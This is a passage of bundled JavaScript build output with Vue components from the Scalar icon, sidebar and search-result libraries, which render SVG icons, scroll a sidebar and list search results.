"M196.2,132.81l-53.36-19.65L123.19,59.8a11.93,11.93,0,0,0-22.38,0L81.16,113.16,27.8,132.81a11.93,11.93,0,0,0,0,22.38l53.36,19.65,19.65,53.36a11.93,11.93,0,0,0,22.38,0l19.65-53.36,53.36-19.65a11.93,11.93,0,0,0,0-22.38Zm-2.77,14.87L138.35,168a4,4,0,0,0-2.37,2.37l-20.3,55.08a3.92,3.92,0,0,1-7.36,0L88,170.35A4,4,0,0,0,85.65,168l-55.08-20.3a3.92,3.92,0,0,1,0-7.36L85.65,120A4,4,0,0,0,88,117.65l20.3-55.08a3.92,3.92,0,0,1,7.36,0L136,117.65a4,4,0,0,0,2.37,2.37l55.08,20.3a3.92,3.92,0,0,1,0,7.36ZM148,40a4,4,0,0,1,4-4h20V16a4,4,0,0,1,8,0V36h20a4,4,0,0,1,0,8H180V64a4,4,0,0,1-8,0V44H152A4,4,0,0,1,148,40Zm96,48a4,4,0,0,1-4,4H228v12a4,4,0,0,1-8,0V92H208a4,4,0,0,1,0-8h12V72a4,4,0,0,1,8,0V84h12A4,4,0,0,1,244,88Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconTag.vue.script.js
var _hoisted_1$108 = { key: 0 };
var _hoisted_2$70 = { key: 1 };
var _hoisted_3$51 = { key: 2 };
var _hoisted_4$34 = { key: 3 };
var _hoisted_5$24 = { key: 4 };
var _hoisted_6$19 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconTag.js
var ScalarIconTag_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconTag",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$108, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M246.15,133.18,146.83,33.86A19.85,19.85,0,0,0,132.69,28H40A12,12,0,0,0,28,40v92.69a19.85,19.85,0,0,0,5.86,14.14l99.32,99.32a20,20,0,0,0,28.28,0l84.69-84.69A20,20,0,0,0,246.15,133.18Zm-98.83,93.17L52,131V52h79l95.32,95.32ZM104,88A16,16,0,1,1,88,72,16,16,0,0,1,104,88Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$70, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M237.66,153,153,237.66a8,8,0,0,1-11.31,0L42.34,138.34A8,8,0,0,1,40,132.69V40h92.69a8,8,0,0,1,5.65,2.34l99.32,99.32A8,8,0,0,1,237.66,153Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M243.31,136,144,36.69A15.86,15.86,0,0,0,132.69,32H40a8,8,0,0,0-8,8v92.69A15.86,15.86,0,0,0,36.69,144L136,243.31a16,16,0,0,0,22.63,0l84.68-84.68a16,16,0,0,0,0-22.63Zm-96,96L48,132.69V48h84.69L232,147.31ZM96,84A12,12,0,1,1,84,72,12,12,0,0,1,96,84Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$51, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M243.31,136,144,36.69A15.86,15.86,0,0,0,132.69,32H40a8,8,0,0,0-8,8v92.69A15.86,15.86,0,0,0,36.69,144L136,243.31a16,16,0,0,0,22.63,0l84.68-84.68a16,16,0,0,0,0-22.63ZM84,96A12,12,0,1,1,96,84,12,12,0,0,1,84,96Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$34, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M241.91,137.42,142.59,38.1a13.94,13.94,0,0,0-9.9-4.1H40a6,6,0,0,0-6,6v92.69a13.94,13.94,0,0,0,4.1,9.9l99.32,99.32a14,14,0,0,0,19.8,0l84.69-84.69A14,14,0,0,0,241.91,137.42Zm-8.49,11.31-84.69,84.69a2,2,0,0,1-2.83,0L46.59,134.1a2,2,0,0,1-.59-1.41V46h86.69a2,2,0,0,1,1.41.59l99.32,99.31A2,2,0,0,1,233.42,148.73ZM94,84A10,10,0,1,1,84,74,10,10,0,0,1,94,84Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$24, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M243.31,136,144,36.69A15.86,15.86,0,0,0,132.69,32H40a8,8,0,0,0-8,8v92.69A15.86,15.86,0,0,0,36.69,144L136,243.31a16,16,0,0,0,22.63,0l84.68-84.68a16,16,0,0,0,0-22.63Zm-96,96L48,132.69V48h84.69L232,147.31ZM96,84A12,12,0,1,1,84,72,12,12,0,0,1,96,84Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$19, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M240.49,138.83,141.17,39.51A11.93,11.93,0,0,0,132.69,36H40a4,4,0,0,0-4,4v92.69a11.93,11.93,0,0,0,3.51,8.48l99.32,99.32a12,12,0,0,0,17,0l84.69-84.69a12,12,0,0,0,0-17Zm-5.66,11.31-84.69,84.69a4,4,0,0,1-5.65,0L45.17,135.51A4,4,0,0,1,44,132.69V44h88.69a4,4,0,0,1,2.82,1.17l99.32,99.32A4,4,0,0,1,234.83,150.14ZM92,84a8,8,0,1,1-8-8A8,8,0,0,1,92,84Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconTerminalWindow.vue.script.js
var _hoisted_1$107 = { key: 0 };
var _hoisted_2$69 = { key: 1 };
var _hoisted_3$50 = { key: 2 };
var _hoisted_4$33 = { key: 3 };
var _hoisted_5$23 = { key: 4 };
var _hoisted_6$18 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconTerminalWindow.js
var ScalarIconTerminalWindow_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconTerminalWindow",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$107, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M72.5,150.63,100.79,128,72.5,105.37a12,12,0,1,1,15-18.74l40,32a12,12,0,0,1,0,18.74l-40,32a12,12,0,0,1-15-18.74ZM144,172h32a12,12,0,0,0,0-24H144a12,12,0,0,0,0,24ZM236,56V200a20,20,0,0,1-20,20H40a20,20,0,0,1-20-20V56A20,20,0,0,1,40,36H216A20,20,0,0,1,236,56Zm-24,4H44V196H212Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$69, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M224,56V200a8,8,0,0,1-8,8H40a8,8,0,0,1-8-8V56a8,8,0,0,1,8-8H216A8,8,0,0,1,224,56Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M128,128a8,8,0,0,1-3,6.25l-40,32a8,8,0,1,1-10-12.5L107.19,128,75,102.25a8,8,0,1,1,10-12.5l40,32A8,8,0,0,1,128,128Zm48,24H136a8,8,0,0,0,0,16h40a8,8,0,0,0,0-16Zm56-96V200a16,16,0,0,1-16,16H40a16,16,0,0,1-16-16V56A16,16,0,0,1,40,40H216A16,16,0,0,1,232,56ZM216,200V56H40V200H216Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$50, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M216,40H40A16,16,0,0,0,24,56V200a16,16,0,0,0,16,16H216a16,16,0,0,0,16-16V56A16,16,0,0,0,216,40Zm-91,94.25-40,32a8,8,0,1,1-10-12.5L107.19,128,75,102.25a8,8,0,1,1,10-12.5l40,32a8,8,0,0,1,0,12.5ZM176,168H136a8,8,0,0,1,0-16h40a8,8,0,0,1,0,16Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$33, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M126,128a6,6,0,0,1-2.25,4.69l-40,32a6,6,0,0,1-7.5-9.38L110.4,128,76.25,100.69a6,6,0,1,1,7.5-9.38l40,32A6,6,0,0,1,126,128Zm50,26H136a6,6,0,0,0,0,12h40a6,6,0,0,0,0-12Zm54-98V200a14,14,0,0,1-14,14H40a14,14,0,0,1-14-14V56A14,14,0,0,1,40,42H216A14,14,0,0,1,230,56Zm-12,0a2,2,0,0,0-2-2H40a2,2,0,0,0-2,2V200a2,2,0,0,0,2,2H216a2,2,0,0,0,2-2Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$23, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M128,128a8,8,0,0,1-3,6.25l-40,32a8,8,0,1,1-10-12.5L107.19,128,75,102.25a8,8,0,1,1,10-12.5l40,32A8,8,0,0,1,128,128Zm48,24H136a8,8,0,0,0,0,16h40a8,8,0,0,0,0-16Zm56-96V200a16,16,0,0,1-16,16H40a16,16,0,0,1-16-16V56A16,16,0,0,1,40,40H216A16,16,0,0,1,232,56ZM216,200V56H40V200H216Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$18, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M122.5,124.88a4,4,0,0,1,0,6.24l-40,32a4,4,0,0,1-5-6.24L113.6,128,77.5,99.12a4,4,0,0,1,5-6.24ZM176,156H136a4,4,0,0,0,0,8h40a4,4,0,0,0,0-8ZM228,56V200a12,12,0,0,1-12,12H40a12,12,0,0,1-12-12V56A12,12,0,0,1,40,44H216A12,12,0,0,1,228,56Zm-8,0a4,4,0,0,0-4-4H40a4,4,0,0,0-4,4V200a4,4,0,0,0,4,4H216a4,4,0,0,0,4-4Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconTextAlignLeft.vue.script.js
var _hoisted_1$106 = { key: 0 };
var _hoisted_2$68 = { key: 1 };
var _hoisted_3$49 = { key: 2 };
var _hoisted_4$32 = { key: 3 };
var _hoisted_5$22 = { key: 4 };
var _hoisted_6$17 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconTextAlignLeft.js
var ScalarIconTextAlignLeft_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconTextAlignLeft",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$106, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M28,64A12,12,0,0,1,40,52H216a12,12,0,0,1,0,24H40A12,12,0,0,1,28,64Zm12,52H168a12,12,0,0,0,0-24H40a12,12,0,0,0,0,24Zm176,16H40a12,12,0,0,0,0,24H216a12,12,0,0,0,0-24Zm-48,40H40a12,12,0,0,0,0,24H168a12,12,0,0,0,0-24Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$68, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M216,64V168a16,16,0,0,1-16,16H40V64Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M32,64a8,8,0,0,1,8-8H216a8,8,0,0,1,0,16H40A8,8,0,0,1,32,64Zm8,48H168a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16Zm176,24H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Zm-48,40H40a8,8,0,0,0,0,16H168a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$49, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M208,32H48A16,16,0,0,0,32,48V208a16,16,0,0,0,16,16H208a16,16,0,0,0,16-16V48A16,16,0,0,0,208,32ZM160,184H64a8,8,0,0,1,0-16h96a8,8,0,0,1,0,16Zm32-32H64a8,8,0,0,1,0-16H192a8,8,0,0,1,0,16ZM56,112a8,8,0,0,1,8-8h96a8,8,0,0,1,0,16H64A8,8,0,0,1,56,112ZM192,88H64a8,8,0,0,1,0-16H192a8,8,0,0,1,0,16Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$32, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M34,64a6,6,0,0,1,6-6H216a6,6,0,0,1,0,12H40A6,6,0,0,1,34,64Zm6,46H168a6,6,0,0,0,0-12H40a6,6,0,0,0,0,12Zm176,28H40a6,6,0,0,0,0,12H216a6,6,0,0,0,0-12Zm-48,40H40a6,6,0,0,0,0,12H168a6,6,0,0,0,0-12Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$22, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M32,64a8,8,0,0,1,8-8H216a8,8,0,0,1,0,16H40A8,8,0,0,1,32,64Zm8,48H168a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16Zm176,24H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Zm-48,40H40a8,8,0,0,0,0,16H168a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$17, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M36,64a4,4,0,0,1,4-4H216a4,4,0,0,1,0,8H40A4,4,0,0,1,36,64Zm4,44H168a4,4,0,0,0,0-8H40a4,4,0,0,0,0,8Zm176,32H40a4,4,0,0,0,0,8H216a4,4,0,0,0,0-8Zm-48,40H40a4,4,0,0,0,0,8H168a4,4,0,0,0,0-8Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconWarningOctagon.vue.script.js
var _hoisted_1$105 = { key: 0 };
var _hoisted_2$67 = { key: 1 };
var _hoisted_3$48 = { key: 2 };
var _hoisted_4$31 = { key: 3 };
var _hoisted_5$21 = { key: 4 };
var _hoisted_6$16 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconWarningOctagon.js
var ScalarIconWarningOctagon_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconWarningOctagon",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$105, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M116,132V80a12,12,0,0,1,24,0v52a12,12,0,0,1-24,0ZM236,91.55v72.9a19.86,19.86,0,0,1-5.86,14.14l-51.55,51.55A19.85,19.85,0,0,1,164.45,236H91.55a19.85,19.85,0,0,1-14.14-5.86L25.86,178.59A19.86,19.86,0,0,1,20,164.45V91.55a19.86,19.86,0,0,1,5.86-14.14L77.41,25.86A19.85,19.85,0,0,1,91.55,20h72.9a19.85,19.85,0,0,1,14.14,5.86l51.55,51.55A19.86,19.86,0,0,1,236,91.55Zm-24,1.66L162.79,44H93.21L44,93.21v69.58L93.21,212h69.58L212,162.79ZM128,156a16,16,0,1,0,16,16A16,16,0,0,0,128,156Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$67, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M224,91.55v72.9a8,8,0,0,1-2.34,5.66l-51.55,51.55a8,8,0,0,1-5.66,2.34H91.55a8,8,0,0,1-5.66-2.34L34.34,170.11A8,8,0,0,1,32,164.45V91.55a8,8,0,0,1,2.34-5.66L85.89,34.34A8,8,0,0,1,91.55,32h72.9a8,8,0,0,1,5.66,2.34l51.55,51.55A8,8,0,0,1,224,91.55Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M120,136V80a8,8,0,0,1,16,0v56a8,8,0,0,1-16,0ZM232,91.55v72.9a15.86,15.86,0,0,1-4.69,11.31l-51.55,51.55A15.86,15.86,0,0,1,164.45,232H91.55a15.86,15.86,0,0,1-11.31-4.69L28.69,175.76A15.86,15.86,0,0,1,24,164.45V91.55a15.86,15.86,0,0,1,4.69-11.31L80.24,28.69A15.86,15.86,0,0,1,91.55,24h72.9a15.86,15.86,0,0,1,11.31,4.69l51.55,51.55A15.86,15.86,0,0,1,232,91.55Zm-16,0L164.45,40H91.55L40,91.55v72.9L91.55,216h72.9L216,164.45ZM128,160a12,12,0,1,0,12,12A12,12,0,0,0,128,160Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$48, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M227.31,80.23,175.77,28.69A16.13,16.13,0,0,0,164.45,24H91.55a16.13,16.13,0,0,0-11.32,4.69L28.69,80.23A16.13,16.13,0,0,0,24,91.55v72.9a16.13,16.13,0,0,0,4.69,11.32l51.54,51.54A16.13,16.13,0,0,0,91.55,232h72.9a16.13,16.13,0,0,0,11.32-4.69l51.54-51.54A16.13,16.13,0,0,0,232,164.45V91.55A16.13,16.13,0,0,0,227.31,80.23ZM120,80a8,8,0,0,1,16,0v56a8,8,0,0,1-16,0Zm8,104a12,12,0,1,1,12-12A12,12,0,0,1,128,184Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$31, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M122,136V80a6,6,0,0,1,12,0v56a6,6,0,0,1-12,0ZM230,91.55v72.9a13.92,13.92,0,0,1-4.1,9.9L174.35,225.9a13.92,13.92,0,0,1-9.9,4.1H91.55a13.92,13.92,0,0,1-9.9-4.1L30.1,174.35a13.92,13.92,0,0,1-4.1-9.9V91.55a13.92,13.92,0,0,1,4.1-9.9L81.65,30.1a13.92,13.92,0,0,1,9.9-4.1h72.9a13.92,13.92,0,0,1,9.9,4.1L225.9,81.65A13.92,13.92,0,0,1,230,91.55Zm-12,0a2,2,0,0,0-.59-1.42L165.87,38.59a2,2,0,0,0-1.42-.59H91.55a2,2,0,0,0-1.41.59L38.58,90.13A2,2,0,0,0,38,91.55v72.9a2,2,0,0,0,.59,1.42l51.54,51.54a2,2,0,0,0,1.42.59h72.9a2,2,0,0,0,1.41-.59l51.56-51.54a2,2,0,0,0,.58-1.42ZM128,162a10,10,0,1,0,10,10A10,10,0,0,0,128,162Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$21, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M120,136V80a8,8,0,0,1,16,0v56a8,8,0,0,1-16,0ZM232,91.55v72.9a15.86,15.86,0,0,1-4.69,11.31l-51.55,51.55A15.86,15.86,0,0,1,164.45,232H91.55a15.86,15.86,0,0,1-11.31-4.69L28.69,175.76A15.86,15.86,0,0,1,24,164.45V91.55a15.86,15.86,0,0,1,4.69-11.31L80.24,28.69A15.86,15.86,0,0,1,91.55,24h72.9a15.86,15.86,0,0,1,11.31,4.69l51.55,51.55A15.86,15.86,0,0,1,232,91.55Zm-16,0L164.45,40H91.55L40,91.55v72.9L91.55,216h72.9L216,164.45ZM128,160a12,12,0,1,0,12,12A12,12,0,0,0,128,160Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$16, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M124,136V80a4,4,0,0,1,8,0v56a4,4,0,0,1-8,0ZM228,91.55v72.9a12,12,0,0,1-3.51,8.49l-51.55,51.55a12,12,0,0,1-8.49,3.51H91.55a12,12,0,0,1-8.49-3.51L31.51,172.94A12,12,0,0,1,28,164.45V91.55a12,12,0,0,1,3.51-8.49L83.06,31.51A12,12,0,0,1,91.55,28h72.9a12,12,0,0,1,8.49,3.51l51.55,51.55A12,12,0,0,1,228,91.55Zm-8,0a4,4,0,0,0-1.17-2.83L167.28,37.17A4.06,4.06,0,0,0,164.45,36H91.55a4.06,4.06,0,0,0-2.83,1.17L37.17,88.72A4,4,0,0,0,36,91.55v72.9a4,4,0,0,0,1.17,2.83l51.55,51.55A4.06,4.06,0,0,0,91.55,220h72.9a4.06,4.06,0,0,0,2.83-1.17l51.55-51.55a4,4,0,0,0,1.17-2.83ZM128,164a8,8,0,1,0,8,8A8,8,0,0,0,128,164Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/sidebar/dist/helpers/scroll-sidebar-to-top.js
var DEFAULT_SCROLL_OFFSET_TOP = 100;
/**
* Returns the element that should be used for vertical position measurement.
*/
var getMeasurableElement = (element) => {
	if (window.getComputedStyle(element).display !== "contents") return element;
	/**
	* `display: contents` does not render a layout box, so use the first child with
	* a measurable offset to keep the scroll target aligned with what users see.
	*/
	for (const child of element.children) if (child instanceof HTMLElement && child.offsetParent !== null) return child;
	return element;
};
/**
* Adds extra offset for heading rows so the selected item stays visible below labels.
*/
var getHeadingOffset = (element) => {
	if (element.dataset.sidebarType !== "heading") return 0;
	return element.querySelector(".sidebar-heading")?.offsetHeight ?? 0;
};
/**
* Computes an element top position relative to the provided scroll container.
*/
var getTopRelativeToScroller = (element, scroller) => {
	let top = element.offsetTop;
	let currentOffsetParent = element.offsetParent;
	while (currentOffsetParent && currentOffsetParent !== scroller) {
		top += currentOffsetParent.offsetTop;
		currentOffsetParent = currentOffsetParent.offsetParent;
	}
	return top;
};
/**
* Scrolls the sidebar container so the requested item appears near the top.
*/
var scrollSidebarToTop = (id, offsetTop = DEFAULT_SCROLL_OFFSET_TOP) => {
	if (typeof window === "undefined") return;
	const element = document.querySelector(`[data-sidebar-id="${id}"]`);
	const scroller = element?.closest(".custom-scroll, .custom-scrollbar") ?? null;
	if (!element || !scroller) return;
	const targetTop = getTopRelativeToScroller(getMeasurableElement(element), scroller) + getHeadingOffset(element) - offsetTop;
	scroller.scrollTo({ top: targetTop > 0 ? targetTop : 0 });
};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarSearchResults/ScalarSearchResultItem.vue.script.js
var _hoisted_1$104 = ["aria-selected"];
var _hoisted_2$66 = {
	key: 0,
	class: "flex h-fit items-center text-sm font-medium text-c-3 group-hover:text-c-1"
};
var _hoisted_3$47 = { class: "flex min-w-0 flex-1 flex-col gap-0.5" };
var _hoisted_4$30 = { class: "flex items-center gap-1" };
var _hoisted_5$20 = { class: "flex-1 truncate zoomed:whitespace-normal! wrap-break-word font-medium" };
var _hoisted_6$15 = {
	key: 0,
	class: "text-base text-c-2"
};
var _hoisted_7$10 = {
	key: 0,
	class: "truncate zoomed:whitespace-normal! wrap-break-word text-c-2"
};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarSearchResults/ScalarSearchResultItem.vue.js
var ScalarSearchResultItem_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarSearchResultItem",
	props: {
		icon: { type: [Object, Function] },
		selected: { type: Boolean }
	},
	setup(__props) {
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("a", mergeProps({
				"aria-selected": __props.selected,
				role: "option",
				tabindex: "-1"
			}, unref(cx)("group flex cursor-pointer gap-2 rounded px-2 py-1.5 no-underline hover:bg-b-2 text-base/5", { "bg-b-2": __props.selected })), [__props.icon ? (openBlock(), createElementBlock("div", _hoisted_2$66, [renderSlot(_ctx.$slots, "icon", {}, () => [__props.icon ? (openBlock(), createBlock(unref(ScalarIconLegacyAdapter_default), {
				key: 0,
				class: "size-4",
				icon: __props.icon
			}, null, 8, ["icon"])) : createCommentVNode("", true)]), _cache[0] || (_cache[0] = createBaseVNode("span", null, " ", -1))])) : createCommentVNode("", true), createBaseVNode("div", _hoisted_3$47, [createBaseVNode("div", _hoisted_4$30, [createBaseVNode("div", _hoisted_5$20, [renderSlot(_ctx.$slots, "default")]), _ctx.$slots.addon ? (openBlock(), createElementBlock("div", _hoisted_6$15, [renderSlot(_ctx.$slots, "addon")])) : createCommentVNode("", true)]), _ctx.$slots.description ? (openBlock(), createElementBlock("div", _hoisted_7$10, [renderSlot(_ctx.$slots, "description")])) : createCommentVNode("", true)])], 16, _hoisted_1$104);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarSearchResults/ScalarSearchResultList.vue.js
var ScalarSearchResultList_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarSearchResultList",
	props: { noResults: { type: Boolean } },
	setup(__props) {
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", mergeProps({ role: "listbox" }, unref(cx)("flex flex-col")), [__props.noResults ? renderSlot(_ctx.$slots, "noResults", {}, () => [_cache[0] || (_cache[0] = createBaseVNode("div", { class: "flex flex-col items-center gap-2 px-3 py-4" }, [createBaseVNode("div", {
				class: "text-base font-medium text-c-2",
				role: "alert"
			}, " No results found ")], -1))], void 0, 0) : createCommentVNode("", true), renderSlot(_ctx.$slots, "default")], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/components/SearchResult.vue.script.js
var _hoisted_1$103 = { class: "sr-only" };
var _hoisted_2$65 = { class: "inline-flex items-center gap-1" };
var _hoisted_3$46 = { class: "sr-only" };
var _hoisted_4$29 = { class: "sr-only" };
var _hoisted_5$19 = { class: "sr-only" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/components/SearchResult.vue.js
var SearchResult_default = /* @__PURE__ */ defineComponent({
	__name: "SearchResult",
	props: {
		id: {},
		isSelected: { type: Boolean },
		result: {},
		modelsSectionLabel: { default: () => DEFAULT_MODELS_SECTION_LABEL }
	},
	setup(__props) {
		const { translate } = useLocalization();
		const ENTRY_ICONS = {
			heading: ScalarIconTextAlignLeft_default,
			model: ScalarIconBracketsCurly_default,
			operation: ScalarIconTerminalWindow_default,
			tag: ScalarIconTag_default,
			webhook: ScalarIconWebhooksLogo_default
		};
		const entryLabels = computed(() => ({
			heading: translate("search.entryHeading"),
			operation: translate("search.entryOperation"),
			tag: translate("search.entryTag"),
			model: __props.modelsSectionLabel,
			webhook: translate("search.entryWebhook")
		}));
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarSearchResultItem_default), {
				id: __props.id,
				icon: ENTRY_ICONS[__props.result.item.type],
				selected: __props.isSelected
			}, createSlots({
				default: withCtx(() => [createBaseVNode("span", { class: normalizeClass({ "text-decoration-line": __props.result.item.entry.type === "operation" && __props.result.item.entry.isDeprecated }) }, [
					createBaseVNode("span", _hoisted_1$103, [createTextVNode(toDisplayString(entryLabels.value[__props.result.item.type]) + ":\xA0 ", 1), __props.result.item.entry.type === "operation" && __props.result.item.entry.isDeprecated ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createTextVNode(" (" + toDisplayString(unref(translate)("schema.deprecated")) + ")\xA0 ", 1)], 64)) : createCommentVNode("", true)]),
					createTextVNode(" " + toDisplayString(__props.result.item.title) + " ", 1),
					_cache[0] || (_cache[0] = createBaseVNode("span", { class: "sr-only" }, ",", -1))
				], 2)]),
				_: 2
			}, [__props.result.item.type !== "webhook" && (__props.result.item.method || __props.result.item.path) && __props.result.item.path !== __props.result.item.title ? {
				name: "description",
				fn: withCtx(() => [createBaseVNode("span", _hoisted_2$65, [
					__props.result.item.type === "operation" ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createVNode(unref(HttpMethod_default$1), {
						"aria-hidden": "true",
						method: __props.result.item.method ?? "get"
					}, null, 8, ["method"]), createBaseVNode("span", _hoisted_3$46, toDisplayString(unref(translate)("common.httpMethod")) + ": " + toDisplayString(__props.result.item.method ?? "get"), 1)], 64)) : createCommentVNode("", true),
					createBaseVNode("span", _hoisted_4$29, toDisplayString(unref(translate)("common.path")) + ":\xA0", 1),
					createTextVNode(" " + toDisplayString(__props.result.item.path), 1)
				])]),
				key: "0"
			} : __props.result.item.description ? {
				name: "description",
				fn: withCtx(() => [createBaseVNode("span", _hoisted_5$19, toDisplayString(unref(translate)("common.description")) + ":\xA0", 1), createTextVNode(" " + toDisplayString(__props.result.item.description), 1)]),
				key: "1"
			} : void 0]), 1032, [
				"id",
				"icon",
				"selected"
			]);
		};
	}
});
//#endregion
//#region node_modules/@headlessui/vue/dist/internal/focus-sentinel.js
var d = defineComponent({
	props: { onFocus: {
		type: Function,
		required: !0
	} },
	setup(t) {
		let n = ref(!0);
		return () => n.value ? h(f, {
			as: "button",
			type: "button",
			features: u.Focusable,
			onFocus(o) {
				o.preventDefault();
				let e, a = 50;
				function r() {
					var u;
